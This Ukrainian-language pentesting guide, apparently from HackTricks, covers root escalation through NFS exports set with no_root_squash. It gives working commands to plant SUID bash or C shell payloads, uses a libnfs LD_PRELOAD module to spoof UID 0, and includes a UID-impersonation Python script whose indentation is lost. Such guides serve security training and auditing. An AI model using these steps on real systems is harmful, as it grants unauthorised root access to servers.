# Ескалація привілеїв через неправильну конфігурацію NFS No Root Squash

## Основна інформація про Squashing

За використання NFS AUTH_SYS/AUTH_UNIX сервер ґрунтує перевірки дозволів на файли на `uid` і `gid`, переданих у кожному RPC-запиті. Інші security flavors, як-от Kerberos, використовують інші облікові дані, а сервер може зіставляти числові облікові дані перед перевіркою дозволів.<sup>[[4]](#references)[[5]](#references)</sup>

- **`all_squash`**: зіставляє кожен UID і GID з анонімним обліковим записом, типовим для Linux є `nobody` (65534). `no_all_squash` є типовим значенням для запитів не від root.<sup>[[4]](#references)</sup>
- **`root_squash`**: це типове значення в Linux; воно зіставляє запити з UID/GID 0 (root) з анонімним обліковим записом. Інші UID і GID не піддаються squashing.<sup>[[4]](#references)</sup>
- **`no_root_squash`**: вимикає root squashing, тому запити з UID/GID 0 можуть оброблятися на сервері як запити від root.<sup>[[4]](#references)</sup>

Якщо дозволений клієнт може підключити для запису export у **`/etc/exports`**, налаштований із **`no_root_squash`**, його запити з UID/GID 0 можуть записувати туди від імені root-користувача сервера.<sup>[[4]](#references)</sup>

Докладніше про **NFS**:

{{#ref}}
../../network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

## Ескалація привілеїв

### Remote Exploit

Варіант 1 із використанням bash:
- На дозволеному клієнті підключіть export для запису від імені root, скопіюйте до нього **`/bin/bash`**, встановіть його біт **SUID** і виконайте його з mountpoint жертви, у якому не використовується `nosuid`.<sup>[[2]](#references)[[4]](#references)</sup>
- Щоб завантажений файл залишався належати root, сервер має використовувати **`no_root_squash`**. Якщо root піддається squashing, SUID-бінарний файл для іншого облікового запису можливий лише тоді, коли клієнт може легітимно створити його або володіти ним із числовими UID/GID цього облікового запису.<sup>[[4]](#references)</sup>
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
Варіант 2 із використанням скомпільованого коду C:
- Підключіть директорію з дозволеного клієнта, скопіюйте скомпільований payload, який зловживає дозволами SUID, установіть його біт **SUID** і виконайте його на victim (див. деякі [C SUID payloads](../processes-crontab-systemd-dbus/payloads-to-execute.md#c)).
- Ті самі обмеження, що й раніше
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
### Локальний Exploit

> [!TIP]
> Зверніть увагу: якщо ви можете створити **тунель зі своєї машини до машини жертви, ви все одно можете використати Remote-версію для exploitation цього privilege escalation, прокинувши необхідні порти**.\
> Наступний трюк корисний, коли `/etc/exports` обмежує export IP-адресою жертви: remote-клієнт не може змонтувати його, але локальна техніка може працювати через share, уже змонтований на дозволеному хості.<sup>[[2]](#references)</sup>\
> Для цього unprivileged методу libnfs export у **`/etc/exports`** має використовувати прапорець `insecure`, щоб процес міг використовувати незарезервований source port; `secure` є значенням за замовчуванням, хоча процесу, здатному прив'язати зарезервований порт, ця опція не потрібна.<sup>[[1]](#references)[[4]](#references)</sup>

### Основна інформація

Клієнт NFSv3 AUTH_UNIX включає свій effective UID, GID і групи в кожен виклик, а сервер використовує їх для перевірки permissions. Ця локальна техніка зловживає цією моделлю, підробляючи RPC credentials через [libnfs](https://github.com/sahlberg/libnfs); його preload-модуль підтримує перевизначення UID/GID у контексті NFS.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[5]](#references)</sup>

#### Компіляція бібліотеки

Приклад libnfs може потребувати коригувань для цільового kernel; у наведеному walkthrough прямо зазначено, що перед компіляцією preload-модуля потрібно закоментувати fallocate syscalls.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
#### Виконання Exploit

У прикладі створюється невеликий C-помічник, який запускає shell, після чого його розміщують у share та використовують `ld_nfs.so` з UID 0 у контексті NFS, щоб зробити його SUID-root.<sup>[[1]](#references)[[2]](#references)</sup>

1. **Компіляція коду Exploit:**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```
2. **Розмістіть exploit на share та змініть його дозволи, підробивши UID**.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```
3. **Виконайте exploit, щоб отримати привілеї root**.<sup>[[2]](#references)</sup>
```bash
/mnt/share/a.out
#root
```
### Bonus: NFShell для прихованого доступу до файлів

Після отримання доступу root цей шаблон `nfsh.py` встановлює effective UID як UID цільового файлу перед запуском команди, що дає змогу отримати доступ без рекурсивної зміни власника.<sup>[[2]](#references)</sup>
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
Запустіть так:
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
## References

- [1] [lnv42/libnfs](https://github.com/lnv42/libnfs)
- [2] [Історія про менш відомий NFS privesc](https://www.errno.fr/nfs_privesc.html)
- [3] [sahlberg/libnfs](https://github.com/sahlberg/libnfs)
- [4] [exports(5) — сторінка посібника Linux](https://man7.org/linux/man-pages/man5/exports.5.html)
- [5] [RFC 1813: специфікація протоколу NFS версії 3](https://datatracker.ietf.org/doc/html/rfc1813)
{{#include ../../banners/hacktricks-training.md}}
